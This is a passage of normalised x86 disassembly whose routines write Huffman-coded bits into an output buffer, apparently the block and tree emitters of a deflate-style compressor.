mov ecx [ esp ]
mov edx [ esp + 0x58 ]
add [ ecx + 0x16ad ] edx
mov eax [ esp ]
movzx edx [ eax + 0xab6 ]
mov [ esp + 0x5c ] edx
mov ax [ esp + 0x5c ]
mov ecx [ esp ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
mov ecx [ esp ]
mov cl [ ecx + 0x16ab ]
and cl 0xff
mov [ eax + edx ] cl
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov ecx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ ecx + edx ] al
mov ecx 0x10
movzx eax [ esp + 0x5c ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x58 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov dx [ eax + 0xab2 ]
mov ecx [ ecx + 0x16ad ]
shl dx cl
mov eax [ esp ]
or [ eax + 0x16ab ] dx
mov ecx [ esp ]
mov edx [ esp + 0x48 ]
add [ ecx + 0x16ad ] edx
mov eax [ esp ]
movzx edx [ eax + 0xab2 ]
mov [ esp + 0x4c ] edx
mov ax [ esp + 0x4c ]
mov ecx [ esp ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
mov ecx [ esp ]
mov cl [ ecx + 0x16ab ]
and cl 0xff
mov [ eax + edx ] cl
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov ecx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ ecx + edx ] al
mov ecx 0x10
movzx eax [ esp + 0x4c ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x48 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov dx [ eax + 0xaae ]
mov ecx [ ecx + 0x16ad ]
shl dx cl
mov eax [ esp ]
or [ eax + 0x16ab ] dx
mov ecx [ esp ]
mov edx [ esp + 0x38 ]
add [ ecx + 0x16ad ] edx
mov ecx [ esp ]
movzx eax [ ecx + 0xaae ]
mov [ esp + 0x3c ] eax
mov ax [ esp + 0x3c ]
mov edx [ esp ]
mov ecx [ edx + 0x16ad ]
mov edx [ esp ]
shl ax cl
or [ edx + 0x16ab ] ax
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov edx [ esp ]
mov dl [ edx + 0x16ab ]
and dl 0xff
mov [ ecx + eax ] dl
mov eax [ esp ]
mov ecx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x3c ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x38 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov ecx [ esp ]
mov ax [ edx + eax * 4 + 0xa6e ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x30 ]
add [ eax + 0x16ad ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
movzx eax [ ecx + edx * 4 + 0xa6e ]
mov [ esp + 0x34 ] eax
mov ax [ esp + 0x34 ]
mov edx [ esp ]
mov ecx [ edx + 0x16ad ]
mov edx [ esp ]
shl ax cl
or [ edx + 0x16ab ] ax
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov edx [ esp ]
mov dl [ edx + 0x16ab ]
and dl 0xff
mov [ ecx + eax ] dl
mov eax [ esp ]
mov ecx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x34 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x30 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov ax [ esp + 0x1c ]
mov ecx [ esp ]
add ax 0xfff5
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x60 ]
add [ edx + 0x16ad ] eax
mov ecx [ esp + 0x1c ]
add ecx 0xfffffff5
mov [ esp + 0x64 ] ecx
mov dx [ esp + 0x64 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x64 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x60 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov [ esp + 0x60 ] 0x7
mov edx [ esp ]
mov eax 0x10
sub eax [ esp + 0x60 ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ax [ esp + 0x1c ]
mov ecx [ esp ]
add ax 0xfffd
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x50 ]
add [ edx + 0x16ad ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
add ecx 0xfffffffd
mov [ esp + 0x54 ] ecx
mov dx [ esp + 0x54 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x54 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x50 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov [ esp + 0x50 ] 0x3
mov edx [ esp ]
mov eax 0x10
sub eax [ esp + 0x50 ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ax [ esp + 0x1c ]
mov ecx [ esp ]
add ax 0xfffd
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x40 ]
add [ edx + 0x16ad ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
add ecx 0xfffffffd
mov [ esp + 0x44 ] ecx
mov dx [ esp + 0x44 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x44 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x40 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov [ esp + 0x40 ] 0x2
mov edx [ esp ]
mov eax 0x10
sub eax [ esp + 0x40 ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
dec [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x18 ]
jne r-xdata
mov [ esp + 0x20 ] 0x8a
mov [ esp + 0x24 ] 0x3
jmp r-xdata
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x24 ] 0x4
mov [ esp + 0x20 ] 0x6
mov [ esp + 0x24 ] 0x3
jmp r-xdata
sub_466cf4
add esp 0xfffffff4
mov [ esp ] eax
mov eax [ esp ]
mov edx [ esp ]
add edx 0x86
mov ecx [ eax + 0xb0e ]
mov eax [ esp ]
call sub_46627c
mov ecx [ esp ]
mov edx [ esp ]
add edx 0x97a
mov eax [ esp ]
mov ecx [ ecx + 0xb1a ]
call sub_46627c
mov edx [ esp ]
mov eax [ esp ]
add edx 0xb22
call sub_465f50
mov [ esp + 0x4 ] 0x12
mov [ esp + 0x8 ] rw-data
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
lea edx [ edx + edx * 2 ]
add edx 0x11
add [ ecx + 0x1697 ] edx
mov eax [ esp + 0x4 ]
add esp 0xc
retn
dec [ esp + 0x4 ]
dec [ esp + 0x8 ]
cmp [ esp + 0x4 ] 0x3
jge r-xdata
mov edx [ esp + 0x8 ]
xor ecx ecx
mov cl [ edx ]
mov eax [ esp ]
cmp [ eax + ecx * 4 + 0xa70 ] 0x0
jne r-xdata
sub_466d90
push ebp
mov ebp esp
add esp 0xffffffcc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x5
mov edx [ ebp - 0x4 ]
mov eax 0x10
sub eax [ ebp - 0x14 ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add ax 0xfeff
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
add [ edx + 0x16ad ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0xfffffeff
mov [ ebp - 0x18 ] ecx
mov dx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x16ad ]
mov eax [ ebp - 0x4 ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov ax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
add ax 0xffff
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
add [ edx + 0x16ad ] eax
mov edx [ ebp - 0xc ]
dec edx
mov [ ebp - 0x20 ] edx
mov ax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov cl [ ecx + 0x16ab ]
and cl 0xff
mov [ eax + edx ] cl
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ ecx + edx ] al
mov ecx 0x10
movzx eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x5
mov eax [ ebp - 0x4 ]
mov ecx 0x10
sub ecx [ ebp - 0x1c ]
cmp ecx [ eax + 0x16ad ]
jge r-xdata
mov ax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add ax 0xfffc
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
add [ edx + 0x16ad ] eax
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov [ ebp - 0x28 ] edx
mov ax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov cl [ ecx + 0x16ab ]
and cl 0xff
mov [ eax + edx ] cl
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ ecx + edx ] al
mov ecx 0x10
movzx eax [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov [ ebp - 0x24 ] 0x4
mov eax [ ebp - 0x4 ]
mov ecx 0x10
sub ecx [ ebp - 0x24 ]
cmp ecx [ eax + 0x16ad ]
jge r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
dec ecx
add edx 0x86
mov eax [ ebp - 0x4 ]
call sub_466400
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
dec ecx
add edx 0x97a
mov eax [ ebp - 0x4 ]
call sub_466400
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x2c ] 0x3
mov ecx [ ebp - 0x4 ]
mov edx 0x10
sub edx [ ebp - 0x2c ]
cmp edx [ ecx + 0x16ad ]
jge r-xdata
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x34 ] rw-data
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x34 ]
xor edx edx
mov ecx [ ebp - 0x4 ]
mov dl [ eax ]
mov eax [ ebp - 0x4 ]
mov dx [ eax + edx * 4 + 0xa70 ]
mov ecx [ ecx + 0x16ad ]
shl dx cl
mov ecx [ ebp - 0x4 ]
or [ ecx + 0x16ab ] dx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
add [ edx + 0x16ad ] eax
mov eax [ ebp - 0x34 ]
xor edx edx
mov ecx [ ebp - 0x4 ]
mov dl [ eax ]
movzx eax [ ecx + edx * 4 + 0xa70 ]
mov [ ebp - 0x30 ] eax
mov ax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x16ad ]
mov edx [ ebp - 0x4 ]
shl ax cl
or [ edx + 0x16ab ] ax
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x16ab ]
and dl 0xff
mov [ ecx + eax ] dl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x4 ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
inc [ ebp - 0x10 ]
inc [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
sub_467190
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x3
mov edx [ ebp - 0x4 ]
mov eax 0x10
sub eax [ ebp - 0x10 ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ax [ ebp + 0x8 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
add [ edx + 0x16ad ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov dx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x16ad ]
mov eax [ ebp - 0x4 ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x169f ]
add eax 0xa
and eax 0xfffffff8
mov [ edx + 0x169f ] eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add ecx 0x4
shl ecx 0x3
add [ eax + 0x169f ] ecx
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46847c
mov esp ebp
pop ebp
retn 0x4
sub_4672b8
add esp 0xffffffdc
mov [ esp ] eax
mov [ esp + 0x4 ] 0x3
mov edx [ esp ]
mov eax 0x10
sub eax [ esp + 0x4 ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov ax 0x2
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x4 ]
add [ edx + 0x16ad ] eax
mov [ esp + 0x8 ] 0x2
mov ecx [ esp ]
mov edx [ esp ]
mov ax [ esp + 0x8 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
mov ecx [ esp ]
mov cl [ ecx + 0x16ab ]
and cl 0xff
mov [ eax + edx ] cl
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov ecx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ ecx + edx ] al
mov ecx 0x10
movzx eax [ esp + 0x8 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov ax [ rw-data ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0xc ]
add [ edx + 0x16ad ] eax
movzx ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov dx [ esp + 0x10 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x10 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0xc ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
movzx ecx [ rw-data ]
mov [ esp + 0xc ] ecx
mov eax 0x10
sub eax [ esp + 0xc ]
mov edx [ esp ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov edx [ esp ]
mov [ edx + 0x16a7 ] 0x7
add esp 0x24
retn
mov [ esp + 0x14 ] 0x3
mov ecx [ esp ]
mov edx 0x10
sub edx [ esp + 0x14 ]
cmp edx [ ecx + 0x16ad ]
jge r-xdata
mov ecx [ esp ]
add [ ecx + 0x169f ] 0xa
mov eax [ esp ]
call sub_468348
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x16a7 ]
add ecx 0xb
sub ecx [ eax + 0x16ad ]
cmp ecx 0x9
jge r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov ax 0x2
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x14 ]
add [ edx + 0x16ad ] eax
mov [ esp + 0x18 ] 0x2
mov eax [ esp ]
mov dx [ esp + 0x18 ]
mov ecx [ eax + 0x16ad ]
shl dx cl
mov eax [ esp ]
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x18 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov ax [ rw-data ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x1c ]
add [ edx + 0x16ad ] eax
movzx ecx [ rw-data ]
mov [ esp + 0x20 ] ecx
mov dx [ esp + 0x20 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x20 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x1c ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
movzx ecx [ rw-data ]
mov [ esp + 0x1c ] ecx
mov eax 0x10
sub eax [ esp + 0x1c ]
mov edx [ esp ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ecx [ esp ]
add [ ecx + 0x169f ] 0xa
mov eax [ esp ]
call sub_468348
sub_4676a4
push ebp
mov ebp esp
add esp 0xffffffd8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x76 ] 0x0
jle r-xdata
mov edx [ ebp - 0xc ]
add edx 0x5
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
